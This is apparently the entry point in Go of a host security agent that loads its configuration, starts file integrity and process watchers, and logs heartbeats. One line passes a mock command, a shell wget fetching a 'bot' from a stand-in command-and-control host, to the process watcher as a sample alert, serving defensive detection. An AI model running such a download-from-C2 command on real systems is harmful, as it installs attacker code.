package main

import (
	"flag"
	"log"
	"time"

	"github.com/hoatzingenz/diagnostic-agent/config"
	"github.com/hoatzingenz/diagnostic-agent/spool"
	"github.com/hoatzingenz/diagnostic-agent/watcher"
)

func main() {
	configPath := flag.String("config", "/etc/diagnostic-agent/config.yaml", "Path to configuration file")
	flag.Parse()

	log.Println("==================================================================")
	log.Println(" Starting Hoatzingenz Diagnostic & Security Protection Agent")
	log.Println("==================================================================")

	cfg, err := config.LoadConfig(*configPath)
	if err != nil {
		log.Fatalf("[FATAL] Failed to load configuration: %v", err)
	}

	log.Printf("[INFO] Agent ID: %s | Environment: %s", cfg.ServerID, cfg.Environment)

	spooler, err := spool.NewSpoolManager(cfg.SpoolDirectory, 52428800)
	if err != nil {
		log.Printf("[WARN] Failed to initialize spool manager: %v", err)
	} else {
		log.Printf("[INFO] Spool manager initialized at %s", cfg.SpoolDirectory)
		_ = spooler
	}

	fim := watcher.NewFIMWatcher(cfg.WatchPaths, cfg.QuarantineDir, cfg.AutoQuarantine)
	procWatcher := watcher.NewProcessWatcher(cfg.WebUsers)

	log.Println("[INFO] FIM file watcher and Process watcher active.")
	log.Println("[INFO] Agent ready. Entering main monitoring loop...")

	// Perform initial scan
	for _, watchPath := range cfg.WatchPaths {
		events, _ := fim.ScanDirectory(watchPath)
		if len(events) > 0 {
			log.Printf("[ALERT] Found %d security events in %s", len(events), watchPath)
		}
	}

	// Mock sample process check
	sampleAlert := procWatcher.InspectProcess(1234, "www-data", "sh -c wget http://malicious-c2.com/bot")
	if sampleAlert != nil {
		log.Printf("[ALERT] %s", sampleAlert.Message)
	}

	// Heartbeat loop
	ticker := time.NewTicker(30 * time.Second)
	for range ticker.C {
		log.Printf("[HEARTBEAT] Diagnostic & Security Agent active. Server: %s", cfg.ServerID)
	}
}
